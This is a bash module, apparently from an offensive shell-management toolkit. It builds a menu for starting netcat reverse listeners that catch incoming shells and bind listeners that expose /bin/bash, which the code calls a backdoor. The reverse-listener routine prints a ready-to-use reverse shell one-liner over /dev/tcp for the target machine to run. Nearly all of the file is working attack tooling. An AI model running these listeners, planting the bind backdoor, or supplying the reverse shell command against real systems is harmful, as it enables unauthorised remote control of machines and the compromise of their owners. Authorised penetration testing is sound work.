#!/bin/bash
################################################################################
# Listeners Module - Bind & Reverse shell listeners
################################################################################

listeners_menu() {
    while true; do
        clear
        echo ""
        echo "$(color_cyan '╔══════════════════════════════════════════╗')"
        echo "$(color_cyan '║')     LISTENERS MENU                      $(color_cyan '║')"
        echo "$(color_cyan '╚══════════════════════════════════════════╝')"
        echo ""
        echo "  $(color_yellow '1.')  Start Reverse Listener  (Catch incoming shells)"
        echo "  $(color_yellow '2.')  Start Bind Listener     (Backdoor listener)"
        echo "  $(color_yellow '3.')  List Active Listeners"
        echo "  $(color_yellow '4.')  Stop Listener"
        echo "  $(color_yellow '5.')  Back to Main Menu"
        echo ""
        echo -n "Select option: "
        read -r choice
        
        case "$choice" in
            1)
                setup_reverse_listener
                ;;
            2)
                setup_bind_listener
                ;;
            3)
                list_listeners
                ;;
            4)
                stop_listener
                ;;
            5)
                break
                ;;
            *)
                error_msg "Invalid option"
                sleep 2
                ;;
        esac
    done
}

# Setup reverse listener
setup_reverse_listener() {
    echo ""
    echo "$(color_cyan '═══ REVERSE LISTENER ═══')"
    echo ""
    
    echo -n "Listen on IP [0.0.0.0]: "
    read -r listen_ip
    listen_ip="${listen_ip:-0.0.0.0}"
    
    echo -n "Listen on PORT [4444]: "
    read -r listen_port
    listen_port="${listen_port:-4444}"
    
    if ! validate_port "$listen_port"; then
        error_msg "Invalid port number"
        sleep 2
        return 1
    fi
    
    echo -n "Use rlwrap for history? [y/n]: "
    read -r use_rlwrap
    
    # Generate session ID
    local session_id=$(generate_session_id)
    create_session "$session_id" "$listen_ip" "$listen_port" "0.0.0.0" "0"
    
    log_info "Starting reverse listener on ${listen_ip}:${listen_port}"
    success_msg "Listener starting..."
    
    # Detect best nc variant
    local nc_cmd="nc"
    if command -v ncat &> /dev/null; then
        nc_cmd="ncat"
    elif command -v netcat &> /dev/null; then
        nc_cmd="netcat"
    fi
    
    # Build command - listen on all interfaces
    local cmd="$nc_cmd -l -n -v -p ${listen_port}"
    
    # Add rlwrap if available and requested
    if [[ "$use_rlwrap" == "y" ]] && command -v rlwrap &> /dev/null; then
        cmd="rlwrap -H ~/.shell_history -r $cmd"
        log_info "rlwrap enabled for session $session_id"
    fi
    
    echo ""
    echo "$(color_green '✓') Reverse listener started on 0.0.0.0:${listen_port}"
    echo "$(color_yellow 'Session ID:') $session_id"
    echo ""
    echo "$(color_cyan 'Connect from target with:') "
    echo "  bash -i >& /dev/tcp/YOUR_IP/${listen_port} 0>&1"
    echo ""
    echo "$(color_cyan 'Session log:') ${SESSION_DIR}/${session_id}.json"
    echo ""
    
    # Log listener started
    log_session "$session_id" "listener_started" "Reverse listener on port ${listen_port}"
    
    # Execute listener
    eval "$cmd"
    
    # Log listener ended
    log_session "$session_id" "listener_ended" "Connection closed"
    log_info "Reverse listener ended for session $session_id"
    sleep 2
}

# Setup bind listener
setup_bind_listener() {
    echo ""
    echo "$(color_cyan '═══ BIND LISTENER ═══')"
    echo ""
    
    echo -n "Listen on PORT [4444]: "
    read -r listen_port
    listen_port="${listen_port:-4444}"
    
    if ! validate_port "$listen_port"; then
        error_msg "Invalid port number"
        sleep 2
        return 1
    fi
    
    echo -n "Enable rlwrap? [y/n]: "
    read -r use_rlwrap
    
    # Generate session ID
    local session_id=$(generate_session_id)
    create_session "$session_id" "127.0.0.1" "$listen_port" "0.0.0.0" "0"
    
    log_info "Starting bind listener on port ${listen_port}"
    success_msg "Bind listener starting..."
    
    # Detect nc variant
    local nc_cmd="nc"
    if command -v ncat &> /dev/null; then
        nc_cmd="ncat"
    fi
    
    # Build command - check if -e flag is supported
    local cmd="$nc_cmd -l -n -v -p ${listen_port} -e /bin/bash"
    
    # Add rlwrap if available
    if [[ "$use_rlwrap" == "y" ]] && command -v rlwrap &> /dev/null; then
        cmd="rlwrap -H ~/.shell_history -r $cmd"
    fi
    
    echo ""
    echo "$(color_green '✓') Bind listener started on port ${listen_port}"
    echo "$(color_yellow 'Session ID:') $session_id"
    echo ""
    echo "$(color_cyan 'To connect:') nc -v 127.0.0.1 ${listen_port}"
    echo ""
    
    # Start in background
    eval "$cmd" &
    local pid=$!
    echo "$(color_yellow 'Listener PID:') $pid"
    echo ""
    
    log_info "Bind listener started with PID $pid on port ${listen_port}"
    log_session "$session_id" "bind_listener_started" "PID=$pid, Port=${listen_port}"
    sleep 3
}

# List active listeners
list_listeners() {
    echo ""
    echo "$(color_cyan '═══ ACTIVE LISTENERS ═══')"
    echo ""
    
    # Find nc/ncat processes
    local listeners=$(ps aux | grep -E '[n]c.*-l' | grep -v grep)
    
    if [[ -z "$listeners" ]]; then
        info_msg "No active listeners"
        echo ""
        sleep 2
        return
    fi
    
    echo "$listeners"
    echo ""
    sleep 3
}

# Stop listener by PID
stop_listener() {
    echo ""
    echo "$(color_cyan '═══ STOP LISTENER ═══')"
    echo ""
    
    echo -n "Enter PID to stop: "
    read -r pid
    
    if ! [[ "$pid" =~ ^[0-9]+$ ]]; then
        error_msg "Invalid PID"
        sleep 2
        return 1
    fi
    
    if kill -9 "$pid" 2>/dev/null; then
        success_msg "Listener stopped (PID: $pid)"
        log_info "Stopped listener with PID $pid"
    else
        error_msg "Failed to stop listener or PID not found"
    fi
    sleep 2
}
